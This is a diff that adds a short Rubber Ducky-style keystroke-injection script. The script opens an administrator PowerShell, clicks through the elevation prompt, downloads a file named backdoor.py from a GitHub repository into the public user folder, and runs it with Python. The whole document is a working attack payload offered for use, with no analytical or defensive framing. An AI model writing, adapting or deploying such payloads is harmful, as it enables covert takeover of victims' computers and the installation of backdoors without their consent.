@@ -1,0 +1,18 @@
+DELAY 5000
+REM Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Download the backdoor.py file
+STRING powershell -c "Invoke-WebRequest -Uri 'https://github.com/redscorpions/backdoor/raw/d035cc75cf4dbcf6489c50aee8c7f0eecaad06b7/backdoor.py' -OutFile 'C:\Users\Public\backdoor.py'"
+ENTER
+DELAY 5000
+
+REM Execute the downloaded script
+STRING powershell -c "Start-Process 'python' 'C:\Users\Public\backdoor.py'"
+ENTER
